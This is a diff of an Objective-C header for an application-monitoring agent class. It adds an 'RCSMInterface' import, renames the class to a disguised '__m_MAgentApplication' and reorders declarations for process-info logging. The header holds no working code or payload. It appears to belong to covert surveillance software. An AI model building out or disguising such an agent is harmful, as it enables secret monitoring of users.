@@ -8,6 +8,8 @@
 
 #import <Foundation/Foundation.h>
 
+#import "RCSMInterface.h"
+
 //typedef __appStruct {
 //  struct tm timestamp;
 //  char *name;
@@ -16,7 +18,7 @@
 //  char *delim;
 //} appStruct;
 
-@interface RCSMAgentApplication : NSObject 
+@interface __m_MAgentApplication : NSObject 
 {
   BOOL      isAppStarted;
   NSString *mProcessName;
@@ -27,18 +29,25 @@
 
 @property (readwrite) BOOL isAppStarted;
 
-+ (RCSMAgentApplication *)sharedInstance;
++ (__m_MAgentApplication *)sharedInstance;
+
 + (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
+
 - (unsigned)retainCount;
-- (void)release;
+- (id)retain;
+
+- (id)copyWithZone: (NSZone *)aZone;
+
 - (id)autorelease;
-- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;
+- (void)release;
+
 - (BOOL)grabInfo: (NSString*)aStatus;
-- (void)sendStopLog;
-- (void)sendStartLog;
+- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;
+
 - (void)start;
 - (BOOL)stop;
+
+- (void)sendStopLog;
+- (void)sendStartLog;
 
 @end
